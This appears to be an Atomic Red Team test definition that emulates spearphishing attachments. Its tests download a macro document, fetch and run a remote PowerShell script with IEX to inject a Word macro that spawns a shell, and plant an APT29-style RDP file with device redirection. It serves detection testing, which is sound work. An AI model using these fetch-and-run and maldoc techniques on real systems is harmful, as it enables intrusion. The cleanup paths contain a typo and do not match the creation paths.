attack_technique: T1566.001
display_name: 'Phishing: Spearphishing Attachment'
atomic_tests:
- name: Download Macro-Enabled Phishing Attachment
  auto_generated_guid: 114ccff9-ae6d-4547-9ead-4cd69f687306
  description: |
    This atomic test downloads a macro enabled document from the Atomic Red Team GitHub repository, simulating an end user clicking a phishing link to download the file.
    The file "PhishingAttachment.xlsm" is downloaded to the %temp% directory.
  supported_platforms:
  - windows
  executor:
    command: |
      $url = 'https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1566.001/bin/PhishingAttachment.xlsm'
      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
      Invoke-WebRequest -Uri $url -OutFile $env:TEMP\PhishingAttachment.xlsm
    name: powershell
    cleanup_command: |
      Remove-Item $env:TEMP\PhishingAttachment.xlsm -ErrorAction Ignore

- name: Word spawned a command shell and used an IP address in the command line
  auto_generated_guid: cbb6799a-425c-4f83-9194-5447a909d67f
  description: |
    Word spawning a command prompt then running a command with an IP address in the command line is an indicator of malicious activity.
    Upon execution, CMD will be launched and ping 8.8.8.8.
  supported_platforms:
  - windows
  input_arguments:
    jse_path:
      description: |
        Path for the macro to write out the "malicious" .jse file
      type: string
      default: C:\Users\Public\art.jse
    ms_product:
      description: Maldoc application Word or Excel
      type: string
      default: Word
  dependency_executor_name: powershell
  dependencies:
  - description: |
      Microsoft #{ms_product} must be installed
    prereq_command: |
      try {
        New-Object -COMObject "#{ms_product}.Application" | Out-Null
        $process = "#{ms_product}"; if ( $process -eq "Word") {$process = "winword"}
        Stop-Process -Name $process
        exit 0
      } catch { exit 1 }
    get_prereq_command: |
      Write-Host "You will need to install Microsoft #{ms_product} manually to meet this requirement"
  executor:
    command: |
      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
      IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)
      $macrocode = "   Open `"#{jse_path}`" For Output As #1`n   Write #1, `"WScript.Quit`"`n   Close #1`n   Shell`$ `"ping 8.8.8.8`"`n"
      Invoke-MalDoc -macroCode $macrocode -officeProduct "#{ms_product}"
    cleanup_command: |
      Remove-Item #{jse_path} -ErrorAction Ignore
    name: powershell

- name: RDP Phishing via Outlook Temporary Folders
  description: |
    Creates .rdp files in Outlook temporary folders to simulate phishing campaign behavior.
    This test simulates the Midnight Blizzard (APT29) campaign targeting organizations with malicious RDP files.
  supported_platforms:
    - windows
  input_arguments:
    rdp_filename:
      description: Name of the RDP file
      type: string
      default: meeting_invite.rdp
  executor:
    name: powershell
    elevation_required: false
    command: |
      $rdpContent = @"
      screen mode id:i:2
      use multimon:i:0
      desktopwidth:i:1920
      desktopheight:i:1080
      session bpp:i:32
      winposstr:s:0,1,0,0,800,600
      compression:i:1
      keyboardhook:i:2
      audiocapturemode:i:0
      videoplaybackmode:i:1
      connection type:i:7
      networkautodetect:i:1
      bandwidthautodetect:i:1
      displayconnectionbar:i:1
      username:s:admin
      domain:s:WORKGROUP
      alternate shell:s:
      shell working directory:s:
      disable wallpaper:i:1
      disable full window drag:i:1
      disable menu anims:i:1
      disable themes:i:0
      disable cursor setting:i:0
      bitmapcachepersistenable:i:1
      full address:s:192.168.1.100
      audiomode:i:0
      redirectprinters:i:1
      redirectcomports:i:0
      redirectsmartcards:i:1
      redirectclipboard:i:1
      redirectposdevices:i:0
      autoreconnection enabled:i:1
      authentication level:i:2
      prompt for credentials:i:0
      negotiate security layer:i:1
      remoteapplicationmode:i:0
      "@
      $outlookPath = "$env:LOCALAPPDATA\Microsoft\Windows\Temporary Internet Files\Content.Outlook"
      $olkPath = "$env:LOCALAPPDATA\Microsoft\Olk"
      
      if(-not (Test-Path $outlookPath)) {
          New-Item -ItemType Directory -Force -Path $outlookPath | Out-Null
      }
      if(-not (Test-Path $olkPath)) {
          New-Item -ItemType Directory -Force -Path $olkPath | Out-Null
      }
      
      $rdpFile1 = Join-Path $outlookPath "#{rdp_filename}"
      Set-Content -Path $rdpFile1 -Value $rdpContent -Force
      $rdpFile2 = Join-Path $olkPath "#{rdp_filename}"
      Set-Content -Path $rdpFile2 -Value $rdpContent -Force
    cleanup_command: |
      $outlookPaths = @(
          "$env:LOCALAPPDATA\Microsoft\Windows\INetCache\Content.Outlook",
          "$env:LOCALAPPPAD\Microsoft\Windows\Temporary Internet Files\Content.Outlook",
          "$env:LOCALAPPDATA\Microsoft\Office\16.0\Olk"
      )
      foreach ($path in $outlookPaths) {
          if (Test-Path $path) {
              Get-ChildItem -Path $path -Filter "#{rdp_filename}" | Remove-Item -Force
          }
      }
